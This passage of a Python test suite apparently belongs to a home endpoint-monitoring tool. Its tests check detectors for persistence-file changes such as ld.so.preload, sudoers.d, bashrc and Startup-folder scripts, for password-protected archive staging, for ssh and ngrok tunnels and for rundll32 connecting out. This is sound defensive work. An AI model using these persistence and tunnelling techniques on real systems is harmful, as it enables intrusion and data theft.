    spec.loader.exec_module(m)
    assert m.linux_inner() in _conf_query("bpf_process_events")
    assert m.linux_outer() in _conf_query("bpf_process_events")
    assert m.windows() in _conf_query("sysmon_events")


# ------------------------------------------------------------ R39 file changes (#167)

def fim(t, file, action="UPDATED"):
    return {"_type": "osquery", "name": "file_changes", "unixTime": int(t), "ts": int(t), "action": "added",
            "columns": {"time": str(int(t)), "action": action, "category": "tapwatch", "file": file}}


def test_file_changes_ship_as_digest_items_with_what_they_would_be():
    det = FileChanged(st())
    pre, rc, auto = run(det, fim(T0, "/etc/ld.so.preload", "CREATED"), fim(T0, "~/.bashrc"),
                        fim(T0, "~/.config/autostart/x.desktop", "CREATED"))
    assert (pre.detector, pre.base_severity, pre.facts["would_alert"], pre.facts["kind"]) == \
        ("host_fim", 3, True, "privilege file")
    assert (rc.facts["kind"], rc.facts["would_alert"], rc.indicators) == ("shell start-up file", False, ["~/.bashrc"])
    assert auto.facts["kind"] == "autostart entry"
    assert run(det, fim(T0 + 60, "~/.bashrc")) == []                      # once a day per file
    assert run(FileChanged(st()), fim(T0, "/etc/hosts")) == []
    alerting = FileChanged(st(), alert=True)
    (live,) = run(alerting, fim(T0, "/etc/sudoers.d/90-x"))
    assert live.base_severity == 4
    assert run(alerting, fim(T0 + 3 * 3600, "/etc/sudoers.d/90-x", "MOVED_TO")) == []   # once a day, at alert level too
    assert "/home/" not in json.dumps(rc.facts)


def test_a_startup_folder_drop_names_the_program_that_wrote_it():
    drop = sysmon(11, T0, path=r"C:\Windows\System32\wscript.exe", file_name="update.vbs", startup_scope="per user")
    (c,) = run(FileChanged(st()), drop)
    assert (c.facts["file"], c.facts["program"], c.facts["would_alert"], c.indicators) == \
        ("update.vbs", "wscript.exe", True, ["update.vbs"])
    no_paths(c)
    assert "Startup folder" in summarize(c, Assets({}))
    inst = sysmon(11, T0, path=r"C:\Program Files\Vendor\setup.exe", file_name="Vendor.lnk", startup_scope="all users")
    (i,) = run(FileChanged(st()), inst)
    assert not i.facts["would_alert"] and i.facts["scope"] == "all users"
    assert "host_fim" in NAMES and "host_fim" in CODE_ONLY


def test_the_agent_logs_file_names_not_paths():
    q = _conf_query("sysmon_events")
    assert "(eventid = 11 AND lower(json_extract(data, '$.EventData.TargetFilename')) LIKE" in q   # Startup only
    assert "AS file_name" in q and "TargetFilename') AS" not in q
    fc = _conf_query("file_changes")
    assert "AS file FROM file_events" in fc and "sed[A-Za-z0-9]{6}" in fc


def test_live_run_fixes_wrappers_chains_and_lifts():
    """2026-10-20 live safe tests: one 7z run raised four cases (bash, timeout, powershell.exe, 7z.exe), and every test
    case was lifted to an alert by an unrelated dns_bypass digest item three minutes earlier."""
    det = FilesStaged(st())
    rows = [lexec(T0, "/usr/bin/bash", archive_pw=1), lexec(T0, "/usr/bin/timeout", archive_pw=1),
            start(T0 + 1, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", EXPLORER, cmd_archive_pw="1"),
            start(T0 + 2, r"C:\Program Files\Vendor\7z.exe", EXPLORER, cmd_archive_pw="1"),
            start(T0 + 3, r"C:\Program Files\Other\7z.exe", EXPLORER, cmd_archive_pw="1")]
    (c,) = run(det, *rows)
    assert c.facts["program"] == "7z.exe"
    assert run(det, start(T0 + 120, r"C:\Program Files\Vendor\7z.exe", EXPLORER, cmd_archive_pw="1")) == []  # digest: once a week
    tun = TunnelOpened(st())
    assert run(tun, lexec(T0, "/usr/bin/bash", tunnel=1)) == []
    assert len(run(tun, lexec(T0, "/usr/bin/ssh", tunnel=1), lexec(T0 + 5, "/usr/bin/ssh", tunnel=1))) == 1
    # a different tunnel program in the same minute is not hidden by the first (review of #240)
    temp = start(T0 + 10, r"C:\Users\<user>\AppData\Local\Temp\ngrok.exe", EXPLORER, cmd_tunnel="1")
    assert run(tun, temp)[0].must_alert
    (f,) = run(FileChanged(st()), fim(T0, "~/.bashrc"))
    assert "max_route" not in f.facts      # no code ceiling: R39 pairs with nothing, and the AI may still escalate



def test_code_review_fixes_for_v03_rules():
    """/code-review of #240: a renamed tool in Temp isn't a wrapper; one program can't hide another; feeds arrive out
    of order."""
    tun = TunnelOpened(st())
    (c,) = run(tun, start(T0, r"C:\Users\<user>\AppData\Local\Temp\cmd.exe", EXPLORER, cmd_tunnel="1"))
    assert c.must_alert and c.facts["program"] == "cmd.exe"
    assert run(tun, lexec(T0, "/tmp/sh", tunnel=1))[0].facts["folder"] == "temp"
    det = FilesStaged(st())
    assert len(run(det, start(T0, r"C:\Program Files\7-Zip\7z.exe", EXPLORER, cmd_archive_pw="1"),
                   start(T0 + 20, r"C:\Users\<user>\AppData\Local\Temp\rar.exe", EXPLORER, cmd_archive_pw="1"))) == 2
    late = FilesStaged(st())
    assert len(run(late, start(T0 + 900, r"C:\Program Files\7-Zip\7z.exe", EXPLORER, cmd_archive_pw="1"))) == 1
    assert len(run(late, lexec(T0, "/usr/bin/zip", archive_pw=1))) == 1      # 15 minutes older, other OS: not chained
    again = FilesStaged(st())
    z = r"C:\Program Files\7-Zip\7z.exe"
    run(again, start(T0 + 1000, z, EXPLORER, cmd_archive_pw="1"), start(T0 + 900, z, EXPLORER, cmd_archive_pw="1"))
    assert again.chain[("archive", "7z.exe", "installed", "", False)] == T0 + 1000   # the late row didn't wind it back


def test_every_network_rule_pairs_with_a_host_rule_or_is_listed_as_never():
    """A new network rule can't be left out of hostrules.PAIRS by accident."""
    import re as _re
    from pathlib import Path

    from tapwatch.hostrules import NEVER_PAIRED, PAIRS
    src = Path(__file__).resolve().parents[1].joinpath("src", "tapwatch", "detectors.py").read_text()
    names = set(_re.findall(r'^\s+name = "([a-z_]+)"', src, _re.MULTILINE)) | set(_re.findall(r'Case\("([a-z_]+)"', src))
    names -= {"base", "hourly"}   # an abstract class; HourlyProfile emits upload_spike, off_hours, upload_stopped
    paired = set().union(*PAIRS.values())
    assert names - paired - NEVER_PAIRED == set()
    assert not paired & NEVER_PAIRED



def test_agent_queries_read_one_process_at_a_time_and_the_ebpf_feeds_are_never_denylisted():
    """2026-10-20: the agent installer restarted osquery while bpf_connections was running; the watchdog marked it
    "may have failed" and skipped it for a day. It was running most of the time: two marker lookups used
    `e.pid IN (b.pid, b.parent)`, which osquery can't use to read one process, so each row read every process's
    environment (all of /proc; 5.2 s vs 0.5 s for 300 rows). Any deploy can restart mid-query, so the feeds the
    rules read are never denylisted."""
    import re as _re
    from pathlib import Path
    raw = Path(__file__).resolve().parents[1].joinpath("agents", "config", "osquery.conf").read_text()
    sched = json.loads(_re.sub(r"^\s*//.*$", "", raw, flags=_re.MULTILINE), strict=False)["schedule"]
    assert not [n for n, q in sched.items() if _re.search(r"pid IN \(", q["query"])]
    assert sched["bpf_connections"]["denylist"] is False and sched["bpf_process_events"]["denylist"] is False



def test_followups_severity_keys_more_wrappers_localtunnel():
    """The other session's review: an attended tunnel can't hide an unattended one; ionice and time are wrappers;
    Windows localtunnel is named for the tool, not node.exe."""
    tun = TunnelOpened(st())
    owner = lexec(T0, "/usr/bin/ssh", tunnel=1)
    owner["columns"].update(claude_session="s1", claude_attended="1")
    other = lexec(T0 + 10, "/usr/bin/ssh", tunnel=1)
    other["columns"].update(claude_session="s2", claude_attended="0")
    assert [c.base_severity for c in run(tun, owner, other)] == [3, 4]
    assert run(TunnelOpened(st()), lexec(T0, "/usr/bin/ionice", tunnel=1), lexec(T0, "/usr/bin/time", tunnel=1)) == []
    (lt,) = run(TunnelOpened(st()), start(T0, r"C:\Program Files\nodejs\node.exe", EXPLORER, cmd_tunnel="1"))
    assert lt.indicators == ["localtunnel"]


def test_correlation_filters_device_and_pairable_rules_before_the_limit():
    from tapwatch.models import Case
    store = Store(":memory:")
    up = Case("upload_spike", PC, T0, "Upload", {"device_mac": "aa:bb:cc:dd:ee:01"}, ["x"], base_severity=3)
    store.add(up, "", None, Route.DIGEST, "test")
    for i in range(450):                              # a burst of unrelated cases on other devices and rules after it
        store.add(Case("new_domain", f"192.168.50.{20 + i % 200}", T0 + 1, "New domain", {}, [f"d{i}.example"],
                       base_severity=1), "", None, Route.LOG, "test")
    staged = Case("host_staging", PC, T0 + 60, "Files sent", {"source": "endpoint", "device_mac": "aa:bb:cc:dd:ee:01"},
                  ["drive2"], base_severity=3)
    rows = store.nearby(staged, 300, {"upload_spike", "takeover"})
    assert [r["detector"] for r in rows] == ["upload_spike"]
    assert store.nearby(staged, 300, set()) == []



def test_noise_cut_windows_scheduled_lolbin_and_a_two_adapter_pc():
    """2026-10-20 noise review: rundll32 started by svchost from System32 connected out daily (one case had 3,454
    hits); the PC's second adapter moved the host and filed the same events twice."""
    svc = r"C:\Windows\System32\svchost.exe"
    rundll = r"C:\Windows\System32\rundll32.exe"
    (c,) = run(LolbinConnects(st()), start(T0, rundll, svc, guid="{r1}"), connect(T0 + 5, rundll, guid="{r1}"))
    assert (c.base_severity, c.facts["windows_service"]) == (3, True)
    (loud,) = run(LolbinConnects(st()), start(T0, rundll, svc, guid="{r2}", cmd_url="1"), connect(T0 + 5, rundll, guid="{r2}"))
    assert loud.base_severity == 4                       # a URL on the command line: still an alert
    (other,) = run(LolbinConnects(st()), start(T0, rundll, EXPLORER, guid="{r3}"), connect(T0 + 5, rundll, guid="{r3}"))
    assert other.base_severity == 4
    state = EndpointState(PC)
    state.update_addresses([{"address": PC}, {"address": "192.168.50.81"}], T0)
    state.update_addresses([{"address": "192.168.50.81"}], T0 + 300)     # the other adapter's snapshot alone
    assert state.host == PC
    state.update_addresses([{"address": "192.168.50.81"}], T0 + 2 * 3600)  # the configured one gone for an hour: move
    assert state.host == "192.168.50.81"



def test_noise_cut_review_dll_location_keeps_the_alert_and_the_hold_covers_a_restart():
    """Review of #250: a scheduled task (svchost) running rundll32 with a DLL in a user folder must still alert, and
    Windows' own weekly digest item must not hide it; right after a start the first snapshot can't move the host."""
    svc = r"C:\Windows\System32\svchost.exe"
    rundll = r"C:\Windows\System32\rundll32.exe"
    det = LolbinConnects(st())
    (own,) = run(det, start(T0, rundll, svc, guid="{d1}"), connect(T0 + 5, rundll, guid="{d1}"))
    (bad,) = run(det, start(T0 + 60, rundll, svc, guid="{d2}", cmd_dllpath="1"), connect(T0 + 65, rundll, guid="{d2}"))
    assert (own.base_severity, bad.base_severity, bad.facts["windows_service"]) == (3, 4, False)
    assert "a DLL from outside the system folders" in bad.facts["unusual"]
    fresh = EndpointState(PC)
    fresh.update_addresses([{"address": "192.168.50.81"}], T0)              # first snapshot after a start: other adapter
    assert fresh.host == PC
    q = _conf_query("sysmon_events")
    assert "AS cmd_dllpath" in q
